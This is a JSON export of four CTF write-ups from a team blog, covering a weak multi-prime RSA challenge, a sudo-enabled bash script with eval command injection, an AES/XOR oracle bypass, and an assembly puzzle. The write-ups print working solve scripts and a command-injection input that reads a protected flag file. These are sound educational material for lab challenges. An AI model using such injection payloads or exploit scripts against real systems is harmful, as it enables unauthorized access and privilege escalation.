[{"content":"tl;dr  List out all 128 factors of N Use that to decrypt the cipher-text  Author : qopruzjf\nChallenge Description   I heard 4096 bit RSA is secure, so I encrypted the flag with it.   This challenge was provided with 2 files: source.py and output.txt, lets have a look at them.\nFiles source.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  from Crypto.Util.number import getPrime, bytes_to_long from private import flag def prod(lst): ret = 1 for num in lst: ret *= num return ret m = bytes_to_long(flag) primes = [getPrime(32) for _ in range(128)] n = prod(primes) e = 65537 print(n) print(pow(m, e, n))   output.txt 1 2  50630448182626893495464810670525602771527685838257974610483435332349728792396826591558947027657819590790590829841808151825744184405725893984330719835572507419517069974612006826542638447886105625739026433810851259760829112944769101557865474935245672310638931107468523492780934936765177674292815155262435831801499197874311121773797041186075024766460977392150443756520782067581277504082923534736776769428755807994035936082391356053079235986552374148782993815118221184577434597115748782910244569004818550079464590913826457003648367784164127206743005342001738754989548942975587267990706541155643222851974488533666334645686774107285018775831028090338485586011974337654011592698463713316522811656340001557779270632991105803230612916547576906583473846558419296181503108603192226769399675726201078322763163049259981181392937623116600712403297821389573627700886912737873588300406211047759637045071918185425658854059386338495534747471846997768166929630988406668430381834420429162324755162023168406793544828390933856260762963763336528787421503582319435368755435181752783296341241853932276334886271511786779019664786845658323166852266264286516275919963650402345264649287569303300048733672208950281055894539145902913252578285197293 15640629897212089539145769625632189125456455778939633021487666539864477884226491831177051620671080345905237001384943044362508550274499601386018436774667054082051013986880044122234840762034425906802733285008515019104201964058459074727958015931524254616901569333808897189148422139163755426336008738228206905929505993240834181441728434782721945966055987934053102520300610949003828413057299830995512963516437591775582556040505553674525293788223483574494286570201177694289787659662521910225641898762643794474678297891552856073420478752076393386273627970575228665003851968484998550564390747988844710818619836079384152470450659391941581654509659766292902961171668168368723759124230712832393447719252348647172524453163783833358048230752476923663730556409340711188698221222770394308685941050292404627088273158846156984693358388590950279445736394513497524120008211955634017212917792675498853686681402944487402749561864649175474956913910853930952329280207751998559039169086898605565528308806524495500398924972480453453358088625940892246551961178561037313833306804342494449584581485895266308393917067830433039476096285467849735814999851855709235986958845331235439845410800486470278105793922000390078444089105955677711315740050638   By seeing the source code, We can clearly see that the N factorizes into 128 primes of lenght 32 bits So by using Sage we can list out all the 128 primes numbers and further continue with the basic RSA operations. It\u0026rsquo;s Ï† function should be the product of all 128 primes, i, with (i-1).\nExploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  from Crypto.Util.number import * from sage.all import * f = open(\u0026#39;output.txt\u0026#39;,\u0026#39;r\u0026#39;).read() n,ct,dummy = f.split(\u0026#39;\\n\u0026#39;) e = 65537 l = list(factor(int(n))) primelist = [] for i in l: primelist.append(i[0]) phi = 1 for i in primelist: phi*=(i-1) d = inverse(e,phi) print(long_to_bytes(pow(int(ct),d,int(n))).decode())   Flag Flag: corctf{to0_m4ny_pr1m3s55_63aeea37a6b3b22f}\n","permalink":"https://1nf1n1ty.team/blog/posts/writeups/corctf/2021/4096/","summary":"tl;dr  List out all 128 factors of N Use that to decrypt the cipher-text  Author : qopruzjf\nChallenge Description   I heard 4096 bit RSA is secure, so I encrypted the flag with it.   This challenge was provided with 2 files: source.py and output.txt, lets have a look at them.\nFiles source.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  from Crypto.","title":"4096 - corCTF 2021"},{"content":"tl;dr  Analyze the permissions of files - try to run the script by user-privileged Inject code at input prompt and get the flag  Permissions Running ls -al we get,\n1 2 3 4 5 6 7 8 9 10  user1@ae284736ac0e:/home/user1$ ls -al total 32 drwxrwxr-t 1 root user1 4096 Aug 27 22:44 . drwxr-xr-x 1 root root 4096 Aug 27 22:43 .. -rw-r--r-- 1 user1 user1 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 user1 user1 3771 Feb 25 2020 .bashrc -rw-r--r-- 1 user1 user1 807 Feb 25 2020 .profile -rwxr-xr-x 1 root user-privileged 945 Aug 27 22:09 devops.sh -rwxr----- 1 root user-privileged 67 Aug 27 22:09 flag.txt   We see that flag.txt can only be read by user-privileged or root.\nLet\u0026rsquo;s try sudo -l to check for file access,\n1 2 3 4 5 6  user1@ae284736ac0e:/home/user1$ sudo -l Matching Defaults entries for user1 on ae284736ac0e: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User user1 may run the following commands on ae284736ac0e: (user-privileged) NOPASSWD: /home/user1/devops.sh   So we can run devops.sh as user-privileged without password. INTERESTING!!\nScript Contents of devops.sh,\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  #!/bin/bash PATH=\u0026#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:\u0026#34; exec 2\u0026gt;/dev/null name=\u0026#34;deploy\u0026#34; while [[ \u0026#34;$1\u0026#34; =~ ^- \u0026amp;\u0026amp; ! \u0026#34;$1\u0026#34; == \u0026#34;--\u0026#34; ]]; do case $1 in -V | --version ) echo \u0026#34;Beta version\u0026#34; exit ;; -d | --deploy ) deploy=1 ;; -p | --permission ) permission=1 ;; esac; shift; done if [[ \u0026#34;$1\u0026#34; == \u0026#39;--\u0026#39; ]]; then shift; fi echo -ne \u0026#34;Welcome To Devops Swiss Knife \\o/\\n\\nWe deploy everything for you:\\n\u0026#34; if [[ deploy -eq 1 ]];then echo -ne \u0026#34;Please enter your true name if you are a shinobi\\n\u0026#34; read -r name eval \u0026#34;function $name{ terraform init \u0026amp;\u0026gt;/dev/null \u0026amp;\u0026amp; terraform apply \u0026amp;\u0026gt;/dev/null ; echo \\\u0026#34;It should be deployed now\\\u0026#34;; }\u0026#34; export -f $name fi isAdmin=0 # Ofc only admins can deploy stuffs o// if [[ $isAdmin -eq 1 ]];then $name fi # Check your current permissions admin-san if [[ $permission -eq 1 ]];then echo \u0026#34;You are: \u0026#34; id fi   The last part of the script helps us in knowing our id,\n1 2 3 4 5  # Check your current permissions admin-san if [[ $permission -eq 1 ]];then echo \u0026#34;You are: \u0026#34; id fi   Let\u0026rsquo;s try it out,\n1 2 3 4 5 6  user1@ae284736ac0e:/home/user1$ ./devops.sh -p Welcome To Devops Swiss Knife \\o/ We deploy everything for you: You are: uid=1000(user1) gid=1000(user1) groups=1000(user1)   1 2 3 4 5 6  user1@ae284736ac0e:/home/user1$ sudo -u user-privileged ./devops.sh -p Welcome To Devops Swiss Knife \\o/ We deploy everything for you: You are: uid=1001(user-privileged) gid=1001(user-privileged) groups=1001(user-privileged)   So we can run the script as user-privileged.\nExploit We see that this part of the script seems interesting,\n1 2 3 4  echo -ne \u0026#34;Please enter your true name if you are a shinobi\\n\u0026#34; read -r name eval \u0026#34;function $name { terraform init \u0026amp;\u0026gt;/dev/null \u0026amp;\u0026amp; terraform apply \u0026amp;\u0026gt;/dev/null ; echo \\\u0026#34;It should be deployed now\\\u0026#34;; }\u0026#34;   So the eval uses our input as part of its exectubale command, Therefore we can inject a command as input and try revealing the flag.\nSolution I gave the input a command like this,\n1  test { cat flag.txt; }; $name; #   Which make the eval part to look something like this,\n1 2  eval \u0026#34;function test { cat flag.txt; }; $name; # { terraform init \u0026amp;\u0026gt;/dev/null \u0026amp;\u0026amp; terraform apply \u0026amp;\u0026gt;/dev/null ; echo \\\u0026#34;It should be deployed now\\\u0026#34;; }\u0026#34;   We just completed the function with a command to read flag.txt, called the function, and commented out rest of the command. This should do the trick and reveal the flag.\nFlag FwordCTF{W00w_KuR0ko_T0ld_M3_th4t_Th1s_1s_M1sdirecti0n_BasK3t_FTW}\n .emojify { font-family: Apple Color Emoji, Segoe UI Emoji, NotoColorEmoji, Segoe UI Symbol, Android Emoji, EmojiSymbols; font-size: 2rem; vertical-align: middle; } @media screen and (max-width:650px) { .nowrap { display: block; margin: 25px 0; } }  ","permalink":"https://1nf1n1ty.team/blog/posts/writeups/fwordctf/2021/devprivops/","summary":"tl;dr  Analyze the permissions of files - try to run the script by user-privileged Inject code at input prompt and get the flag  Permissions Running ls -al we get,\n1 2 3 4 5 6 7 8 9 10  user1@ae284736ac0e:/home/user1$ ls -al total 32 drwxrwxr-t 1 root user1 4096 Aug 27 22:44 . drwxr-xr-x 1 root root 4096 Aug 27 22:43 .. -rw-r--r-- 1 user1 user1 220 Feb 25 2020 .","title":"devprivops"},{"content":"tl;dr  Analyze the source code - decrypted cipher should contain \u0026quot;FwordCTF\u0026quot; Send an AES encrypted \u0026quot;FwordCTF\u0026quot; payload and the key, and get the flag  Source Code We are given the source code,\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73  #!/usr/bin/env python3.8 from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad import sys, os FLAG = b\u0026#34;FwordCTF{###############################################################}\u0026#34; WELCOME = \u0026#39;\u0026#39;\u0026#39; Welcome to Enc/Dec Oracle. \u0026#39;\u0026#39;\u0026#39; key = os.urandom(32) print(key.hex()) def xor(a, b): return bytearray([a[i % len(a)] ^ b[i % len(b)] for i in range(max(len(a), len(b)))]) def encrypt(msg): aes = AES.new(key, AES.MODE_ECB) if len(msg) % 16 != 0: msg = pad(msg, 16) cipher = aes.encrypt(msg) cipher = xor(cipher, key) return cipher print(key.hex(), encrypt(b\u0026#34;FwordCTF\u0026#34;).hex()) def decrypt(cipher, k): aes = AES.new(k, AES.MODE_ECB) cipher = xor(cipher, k) msg = unpad(aes.decrypt(cipher), 16) return msg class Leaky_Blinders: def __init__(self): print(WELCOME + f\u0026#34;Here is the encrypted flag : {encrypt(FLAG).hex()}\u0026#34;) def start(self): try: while True: print(\u0026#34;\\n1- Encrypt\u0026#34;) print(\u0026#34;2- Decrypt\u0026#34;) print(\u0026#34;3- Leave\u0026#34;) c = input(\u0026#34;\u0026gt; \u0026#34;) if c == \u0026#39;1\u0026#39;: msg = os.urandom(32) cipher = encrypt(msg) if all(a != b for a, b in zip(cipher, key)): print(cipher.hex()) else: print(\u0026#34;Something seems leaked !\u0026#34;) elif c == \u0026#39;2\u0026#39;: k = bytes.fromhex(input(\u0026#34;\\nKey : \u0026#34;)) cipher = bytes.fromhex(input(\u0026#34;Ciphertext : \u0026#34;)) flag = decrypt(cipher, k) if b\u0026#34;FwordCTF\u0026#34; in flag: print(f\u0026#34;Well done ! Here is your flag : {FLAG}\u0026#34;) else: sys.exit(\u0026#34;Wrong key.\u0026#34;) elif c == \u0026#39;3\u0026#39;: sys.exit(\u0026#34;Goodbye :)\u0026#34;) except Exception: sys.exit(\u0026#34;System error.\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: challenge = Leaky_Blinders() challenge.start()   This is the part we are interested in,\n54 55 56 57 58 59  elif c == \u0026#39;2\u0026#39;: k = bytes.fromhex(input(\u0026#34;\\nKey : \u0026#34;)) cipher = bytes.fromhex(input(\u0026#34;Ciphertext : \u0026#34;)) flag = decrypt(cipher, k) if b\u0026#34;FwordCTF\u0026#34; in flag: print(f\u0026#34;Well done ! Here is your flag : {FLAG}\u0026#34;)   We can easily bypass this check by providing our own cipher and key, note the condition if b\u0026quot;FwordCTF\u0026quot; in flag:, as long as our decrypted text contains \u0026quot;FwordCTF\u0026quot;, we\u0026rsquo;ll get our flag.\nSolution I\u0026rsquo;ve written a simple Python script to do the bypass discussed before,\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  import pwn from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad import os key = os.urandom(32) def xor(a, b): return bytearray( [a[i % len(a)] ^ b[i % len(b)] for i in range(max(len(a), len(b)))] ) def encrypt(msg): aes = AES.new(key, AES.MODE_ECB) if len(msg) % 16 != 0: msg = pad(msg, 16) cipher = aes.encrypt(msg) cipher = xor(cipher, key) return cipher conn = pwn.remote(\u0026#34;52.149.135.130\u0026#34;, 4869) conn.recvuntil(b\u0026#34;\u0026gt; \u0026#34;) conn.sendline(b\u0026#34;2\u0026#34;) conn.recvuntil(b\u0026#34;Key : \u0026#34;) conn.sendline(key.hex().encode()) conn.recvuntil(b\u0026#34;Ciphertext : \u0026#34;) conn.sendline(encrypt(b\u0026#34;FwordCTF\u0026#34;).hex().encode()) print(conn.recv(2014))   Flag FwordCTF{N3v3r_x0r_w1thout_r4nd0m1s1ng_th3_k3y_0r_m4yb3_s3cur3_y0ur_c0d3}\n .emojify { font-family: Apple Color Emoji, Segoe UI Emoji, NotoColorEmoji, Segoe UI Symbol, Android Emoji, EmojiSymbols; font-size: 2rem; vertical-align: middle; } @media screen and (max-width:650px) { .nowrap { display: block; margin: 25px 0; } }  ","permalink":"https://1nf1n1ty.team/blog/posts/writeups/fwordctf/2021/leaky-blinders/","summary":"tl;dr  Analyze the source code - decrypted cipher should contain \u0026quot;FwordCTF\u0026quot; Send an AES encrypted \u0026quot;FwordCTF\u0026quot; payload and the key, and get the flag  Source Code We are given the source code,\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73  #!","title":"Leaky Blinders - FwordCTF 2021"},{"content":"tl;dr  Analyze the given asm code - Find the flag Flag format is Hero{input: modified}  write-up From the question, we can understand that the flag for this challenge should come in the format Hero{input: modified}. So there are 2 key things we have to find here. One is input and another one is modified. The challenge provided us with asm file.\nupon inspection, we can understand that both input and modified are integer values.\nThe modified value is given inside the if condition.\nFrom this, we can understand the input bit shifts left 2 times. So we can open an online bit shift convertor to find the input value.\nSo the input value is 5349616. Now putting all this together we get our flag as Hero{5349616:1337404}. That\u0026rsquo;s it, guys !. We got our flag to submit. This was fairly an easy one. We didn\u0026rsquo;t have to use any tools and all we needed to understand was a bit of assembly language. Thank you for reading the write-up and hope you have a good day.\nFlag The flag thus obtained is: Hero{5349616:1337404}\n","permalink":"https://1nf1n1ty.team/blog/posts/writeups/heroctfv3/2021/easyassembly/","summary":"tl;dr  Analyze the given asm code - Find the flag Flag format is Hero{input: modified}  write-up From the question, we can understand that the flag for this challenge should come in the format Hero{input: modified}. So there are 2 key things we have to find here. One is input and another one is modified. The challenge provided us with asm file.\nupon inspection, we can understand that both input and modified are integer values.","title":"EasyAssembly"}]